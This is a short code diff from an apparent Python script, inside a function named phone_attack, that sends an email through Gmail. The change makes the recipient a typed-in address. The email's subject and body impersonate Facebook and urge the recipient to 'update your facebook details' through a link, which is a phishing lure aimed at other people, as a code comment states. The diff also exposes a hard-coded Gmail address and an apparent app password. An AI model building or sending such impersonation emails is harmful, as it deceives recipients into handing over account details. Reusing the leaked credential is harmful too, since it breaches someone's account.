@@ -14,7 +14,7 @@ phone_attack()
 # Your details (update these!)
 sender_email = "siphelelenabo969@gmail.com"
 app_password = "rjuo tais qwju ntzr"  # From Google App Passwords (no spaces!)
-recipient_email = "siphelelen@redalert.co.za"  # Test with your own email first
+recipient_email = input("enter the receiver email")  # Test with your own email first
 subject = "facebook.com"
 body = "please click at the link below to update you facebook details http://facebook.com  🎉" # this is the body of the email for it to go through another person 
 
